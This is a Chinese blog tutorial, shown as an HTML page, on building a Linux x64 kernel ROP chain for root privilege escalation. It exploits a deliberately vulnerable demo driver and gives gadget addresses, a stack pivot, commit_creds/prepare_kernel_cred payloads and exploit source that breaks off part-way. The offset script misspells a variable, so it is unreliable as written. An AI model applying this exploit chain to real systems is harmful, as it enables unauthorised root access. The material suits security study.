@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Linux x64内核ROP | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="这是篇文章主要介绍一下Linux内核中的ROP chain如何构造来提升用户权限。内核ROP经常用来绕过和非可执行内存区域相关的限制，例如，在默认内核上，它提供了一种可以绕过内核和用户地址分离缓解技术（例如SMEP）的方法。结果成功需要满足如下条件：  执行一个权限提升的有效载荷 可以引用驻留在用户空间的数据（允许从用户空间获取数据） 驻留在用户空间的指令可能不能被执行  在典型的ret2usr攻">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux x64内核ROP">
+<meta property="og:url" content="http://example.com/2017/06/28/Linux-x64%E5%86%85%E6%A0%B8ROP/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="这是篇文章主要介绍一下Linux内核中的ROP chain如何构造来提升用户权限。内核ROP经常用来绕过和非可执行内存区域相关的限制，例如，在默认内核上，它提供了一种可以绕过内核和用户地址分离缓解技术（例如SMEP）的方法。结果成功需要满足如下条件：  执行一个权限提升的有效载荷 可以引用驻留在用户空间的数据（允许从用户空间获取数据） 驻留在用户空间的指令可能不能被执行  在典型的ret2usr攻">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/kernelrop/drv.png">
+<meta property="og:image" content="http://example.com/images/kernelrop/commitcreds.png">
+<meta property="og:image" content="http://example.com/images/kernelrop/rootshell.png">
+<meta property="article:published_time" content="2017-06-28T14:12:21.000Z">
+<meta property="article:modified_time" content="2020-11-12T02:26:14.715Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Kernel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/kernelrop/drv.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Linux-x64内核ROP" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/06/28/Linux-x64%E5%86%85%E6%A0%B8ROP/" class="article-date">
+  <time datetime="2017-06-28T14:12:21.000Z" itemprop="datePublished">2017-06-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Linux x64内核ROP
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这是篇文章主要介绍一下Linux内核中的ROP chain如何构造来提升用户权限。内核ROP经常用来绕过和非可执行内存区域相关的限制，例如，在默认内核上，它提供了一种可以绕过内核和用户地址分离缓解技术（例如SMEP）的方法。<br>结果成功需要满足如下条件：</p>
+<ul>
+<li>执行一个权限提升的有效载荷</li>
+<li>可以引用驻留在用户空间的数据（允许从用户空间获取数据）</li>
+<li>驻留在用户空间的指令可能不能被执行</li>
+</ul>
+<p>在典型的<code>ret2usr</code>攻击中，内核执行流被重定向到一个用户空间的地址，这个地址中包含了提权的载荷：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__((regparm(3))) payload() &#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述提权payload会分配一个新的凭证结构（uid=0, gid=0等）并将它应用到调用进程。我们可以构建一个ROP链，使得这个链不需要执行任何驻留在用户空间中的结构就会执行上述操作，在内核中执行整个权限提升payload。实际中可能不太必要，比如要绕过<code>SMEP</code>，使用一个ROP翻转<code>smep</code>，然后就可以在用户空间执行一个标准的权限提升过程了。<br>ROP链看起来大概是这样的：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+-------------------------------+</span><br><span class="line">|       pop %rdi; ret           |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|              NULL             |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| addr of prepare_kernel_cred() |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|      mov %rax, %rdi; ret      |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|     addr of commit_creds()    |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|              ...              |</span><br><span class="line">+-------------------------------+</span><br></pre></td></tr></table></figure>
+<p>这里的ROP构造和用户空间的ROP构造基本相同，后面会讨论一些凭据适用就返回给用户空间的细节。<br>下面先讲一下如何找到有用的ROP gadgets，我用的是Ubuntu 12.04.5 x86_64，下载编译了linux-3.13源码。</p>
+<h3 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h3><p>和用户空间的程序相同，ROP gadgets可以从内核二进制文件vmlinux中提取。用ROPgadget找vmlinux中的gadgets速度总是很慢，这里可以先将所有的gadgets识别出来：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary vmlinux &gt; ropgadget</span><br><span class="line">$ grep &#39;: pop rdi ; ret&#39; ropgadget </span><br><span class="line">0xffffffff810d783d : pop rdi ; ret    &lt;--- our first gadget</span><br><span class="line">0xffffffff8215673a : pop rdi ; ret 0</span><br><span class="line">0xffffffff8189ae00 : pop rdi ; ret 0x3018</span><br><span class="line">0xffffffff81f5ef0d : pop rdi ; ret 0x31</span><br><span class="line">0xffffffff818463ec : pop rdi ; ret 0x40a3</span><br><span class="line">0xffffffff812f8501 : pop rdi ; ret 0x42</span><br><span class="line">0xffffffff8197d423 : pop rdi ; ret 0x74ab</span><br><span class="line">0xffffffff8197d437 : pop rdi ; ret 0x74d8</span><br><span class="line">0xffffffff8181c158 : pop rdi ; ret 0x81a6</span><br><span class="line">0xffffffff82048be1 : pop rdi ; ret 0x87</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>这样就能在识别出的ROP gadgets里快速找出需要的gadget了。上述的gadgets都可以被使用。<code>ret [num]</code>这样的gadget会将栈指针递增，ret使用一个操作数来表示在获取下一条指令后从栈中弹出的字节数。注意：一个gadget可能是在一个非执行页中，这时要找一个可代换的gadget。<br>找到<code>prepare_kernel_cred</code>和<code>commit_creds</code>的地址：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo grep prepare_kernel_cred &#x2F;proc&#x2F;kallsyms</span><br><span class="line">ffffffff81092870 T prepare_kernel_cred</span><br><span class="line">$ sudo grep commit_creds &#x2F;proc&#x2F;kallsyms</span><br><span class="line">ffffffff81092570 T commit_creds</span><br></pre></td></tr></table></figure>
+<p>ROP链的初步构造如下：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+----------------------------------------------+</span><br><span class="line">| 0xffffffff810d783d : pop rdi ; ret           |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| NULL                                         |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| 0xffffffff81092870 : prepare_kernel_cred     |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| 0xffffffff8110eaa3 : pop rdx ; ret           |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| 0xffffffff81092570 : commit_creds            |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| 0xffffffff81036321 : mov rdi, rax ; call rdx |</span><br><span class="line">+----------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="有漏洞的驱动"><a href="#有漏洞的驱动" class="headerlink" title="有漏洞的驱动"></a>有漏洞的驱动</h3><p>为了演示内核中ROP链的可用性，用以下有漏洞的驱动进行演示：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">drv_req</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> offset;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">device_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> args)</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">drv_req</span> *<span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">void</span> (*fn)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        req = (struct drv_req *)args;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;size = %lx\n&quot;</span>, req-&gt;offset);</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;fn is at %p\n&quot;</span>, &amp;ops[req-&gt;offset]);</span><br><span class="line">        fn = &amp;ops[req-&gt;offset];</span><br><span class="line">        fn();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>ops</code>数组没有进行边界检查。用户提供的偏移量足够大就可以在用户空间或内核空间中访问任何内存地址。<br>驱动在加载时注册<code>/dev/vulndrv</code>设备并打印<code>ops</code>数组地址。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo insmod drv.ko</span><br><span class="line">$ sudo chmod 777 &#x2F;dev&#x2F;vulndrv</span><br></pre></td></tr></table></figure>
+<p>我们可以通过提供给用户空间的ioctl接口到达漏洞代码。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过提供一种预先计算的偏移，任何内核空间中的存储地址都可以被执行。我们可以把<code>fn()</code>指向mmap的用户空间存储地址（含提权的payload），但是要记住最初的需求：驻留在用户空间的指令不应该被执行。<br><strong>Stack Pivot</strong><br>因为不能将内核控制流重定向到用户空间地址，所以需要在内核空间中寻找合适的gadget。在用户空间中准备我们的ROP链，然后将栈指针设置到ROP链的开头。这样不直接执行驻留在用户空间中的指令，而是从用户空间中获取指向内核空间中的指令。<br>在有漏洞的函数<code>device_ioctl()</code>的开头设断点，我们可以在函数指针解引用之前检查寄存器的值。这里因为我是用IDA调试，不太会加载驱动程序的代码段到IDA中，所以在调试内核的IDA之外又开了一个IDA，反编译驱动程序的二进制文件，然后在前一个IDA中的<code>breakpoints</code>里插入断点。<br><img src="/images/kernelrop/drv.png"><br>由驱动的反汇编代码可知<code>rax</code>包含要执行的指令地址。我们可以提前计算这个地址，因为已知ops数组的基地址和用户传递的offset值。例如，给定的ops基地址<code>0xffffffffaaaaaaaf</code>和<code>offset=0×6806288</code>，<code>fn</code>地址为<code>0xffffffffaaaaaaaf+8*0×6806288=0xffffffffdeadbeef</code>。<br>反过来，可以计算出需要执行的内核目标地址相对ops数组的偏移值。有很多stack pivot的gadgets，例如用户空间常见的stack pivot如下：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov %rsp, %r*x ; ret</span><br><span class="line">mov %rsp, ... ; ret</span><br><span class="line">xchg %r*x, %rsp ; ret</span><br></pre></td></tr></table></figure>
+<p>在内核空间执行任意代码，需要把栈指针设置到我们控制的用户空间地址。虽然我们的测试环境是64位，但是最后一个stack pivot使用32位寄存器，即<code>xchg %e*x, %esp;ret</code>或<code>xchg %esp, %e*x;ret</code>，这里用到的是<code>xchg eax, esp;ret</code>（执行完指令后高32位都会被清0）。如果<code>rax</code>包含有效的内核内存地址（例如<code>0xffffffff********</code>），则该stack pivot指令将<code>rax</code>的低32位（<code>0x********</code>为用户空间地址）设置为新的栈指针。由于该<code>rax</code>值在执行fn()之前已知，所以我们知道新的用户空间栈将在哪里，并相应地执行mmap操作。(这里是<strong>关键</strong>：<code>rax</code>表示了内核中gadget的地址，其低32位<code>eax</code>表示了一个用户空间地址)<br>内核中有很多适合的包含xchg指令的stack pivots：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ grep &#39;: xchg eax, esp ; ret&#39; ropgadget</span><br><span class="line">0xffffffff81000085 : xchg eax, esp ; ret</span><br><span class="line">0xffffffff8221be67 : xchg eax, esp ; ret 0</span><br><span class="line">0xffffffff8155b554 : xchg eax, esp ; ret 0x103d</span><br><span class="line">0xffffffff81023d99 : xchg eax, esp ; ret 0x10a8</span><br><span class="line">0xffffffff81733be2 : xchg eax, esp ; ret 0x12eb</span><br><span class="line">0xffffffff814a581d : xchg eax, esp ; ret 0x148</span><br><span class="line">0xffffffff81198279 : xchg eax, esp ; ret 0x148d</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>选择stack pivot gadget时，唯一需要注意的是要8字节对齐（因为ops是8字节指针的数组，而且其基址是8字节对齐的），下面的脚本可以查找合适的gadget：  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">base_addr = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&#x27;r&#x27;</span>) <span class="comment"># gadgets</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    target_str, gadget = line.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    target_addr = <span class="built_in">int</span>(target_str, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> target_addr % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    offset = (traget_addr - base_addr) / <span class="number">8</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;offset = &#x27;</span>, (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) + offset</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;gadget = &#x27;</span>, gadget.strip()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;stack addr = %x&#x27;</span> % (target_addr &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">============================================================</span><br><span class="line">$ cat ropgadget | grep <span class="string">&#x27;: xchg eax, esp ; ret&#x27;</span> &gt; stackpivots</span><br><span class="line">$ ./find_offset.py ffffffffa02d8340 stackpivots</span><br><span class="line">offset = <span class="number">18446744073644277591</span></span><br><span class="line">gadget = xchg eax, esp ; ret <span class="number">0x14ff</span></span><br><span class="line">stack addr = <span class="number">810</span>d7df8</span><br></pre></td></tr></table></figure>
+<p>stack addr表示ROP链需要<code>mmaped(fake_stack)</code>的用户空间地址：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *fake_stack;</span><br><span class="line"></span><br><span class="line">mmap_addr = stack_addr &amp; <span class="number">0xfffff000</span>;</span><br><span class="line">assert((mapped = mmap((<span class="keyword">void</span>*)mmap_addr, <span class="number">0x2000</span>, PROT_EXEC|PROT_READ|PROT_WRITE,</span><br><span class="line">    MAP_POPULATE|MAP_FIXED|MAP_GROWSDOWN, <span class="number">0</span>, <span class="number">0</span>)) == (<span class="keyword">void</span>*)mmap_addr);</span><br><span class="line"></span><br><span class="line">fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr);</span><br><span class="line">*fake_stack ++= <span class="number">0xffffffff810d783d</span>UL; <span class="comment">/* pop %rdi; ret */</span></span><br><span class="line"></span><br><span class="line">fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr + <span class="number">0x9d5f</span>);</span><br></pre></td></tr></table></figure>
+<p>这里选择的stack pivot带有操作数，表示执行完<code>xchg eax, esp; ret</code>（即<code>xchg eax, esp; pop eip</code>，此时<code>esp</code>就指向了<code>eax</code>表示的用户空间栈<code>fake_stack</code>，<code>eip</code>就变成了<code>fake_stack</code>中的gadget）之后，会弹出栈上的0x14ff个字节，按道理讲第二条ROP链应该位于<code>fake_stack</code>偏移为0x14ff+8的位置，但是通过调试发现偏移却是0x9d5f（调试时在device_ioctl的call rax下断点，单步执行查看rsp变化即可）。<br><strong>Payload</strong><br>我们在用户空间中准备ROP链：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr);</span><br><span class="line"></span><br><span class="line">*fake_stack ++= <span class="number">0xffffffff810d783d</span>UL;   <span class="comment">/* pop %rdi; ret */</span></span><br><span class="line">fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr + <span class="number">0x9d5f</span>);</span><br><span class="line">*fake_stack ++= <span class="number">0x0</span>UL;                  <span class="comment">/* NULL */</span></span><br><span class="line">*fake_stack ++= <span class="number">0xffffffff81092870</span>UL;   <span class="comment">/* prepare_kernel_cred() */</span></span><br><span class="line">*fake_stack ++= <span class="number">0xffffffff8110eaa3</span>UL;   <span class="comment">/* pop %rdx; ret */</span></span><br><span class="line"><span class="comment">//*fake_stack ++= 0xffffffff81092570UL; /* commit_creds() */</span></span><br><span class="line">*fake_stack ++= <span class="number">0xffffffff81092576</span>UL;   <span class="comment">/* commit_creds() + 2 instructions */</span></span><br><span class="line">*fake_stack ++= <span class="number">0xffffffff81036321</span>UL;   <span class="comment">/* mov %rax, %rdi; call %rdx */</span></span><br></pre></td></tr></table></figure>
+<p>这里对<code>commit_creds()</code>地址进行了一些修改，地址偏移了2个指令。因为<code>commit_creds()</code>是通过call调用的（call rdx）。call指令在跳转到目标地址之前将返回地址压栈，因此执行完<code>commit_creds()</code>后，控制会转移到保存的返回地址。但是我们希望其转移到ROP链中的下一个gadget。跳过函数开头的<code>push rbp</code>即可（函数执行完，pop指令会把保存的返回地址弹出到rbp中），ret会将控制流转移到ROP链中的下一个gadget。<br><img src="/images/kernelrop/commitcreds.png"><br><strong>固定</strong><br>上述ROP链可以得到调用进程超级用户的权限，但是，所有ROP gadgets执行完之后，需要用之前介绍过的<a target="_blank" rel="noopener" href="http://pwn4.fun/2017/04/20/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%89%EF%BC%89Kernel-Stack-Buffer-Overflow/">iret</a>（特权返回）指令从内核空间返回到用户空间进程。这里为64位操作数的iretq，堆栈布局如下所示：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+---------+&lt;---Low mem addr</span><br><span class="line">|   RIP   |</span><br><span class="line">+---------+</span><br><span class="line">|    CS   |</span><br><span class="line">+---------+</span><br><span class="line">| EFLAGS  |</span><br><span class="line">+---------+</span><br><span class="line">|   RSP   |</span><br><span class="line">+---------+</span><br><span class="line">|    SS   |</span><br><span class="line">+---------+&lt;---High mem addr</span><br></pre></td></tr></table></figure>
+<p>下面扩展ROP链，包含一个新的用户空间指令指针（RIP），用户空间栈指针（RSP），代码和堆栈段选择器（CS和SS），以及具有各种状态信息的EFLAGS寄存器。可以使用下面的save_state()函数从用户空间进程获取CS，SS和EFLAGS值：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">        : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>内核.text段的iretq指令地址可以通过objdump获得：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -j .text -d vmlinux | grep iretq | head -1</span><br><span class="line">ffffffff81051fe6:       48 cf                   iretq</span><br></pre></td></tr></table></figure>
+<p>最后要注意的是，在执行iret之前，64位系统需要实现swapgs指令。该指令通过用一个MSR中的值交换GS寄存器的内容。在进入内核空间例行程序(例如系统调用)时会执行swapgs指令以获取指向内核数据结构的指针，因此在返回用户空间之前需要一个匹配的swapgs。<br>最后完整的exp如下：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;drv.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_PATH <span class="meta-string">&quot;/dev/vulndrv&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> 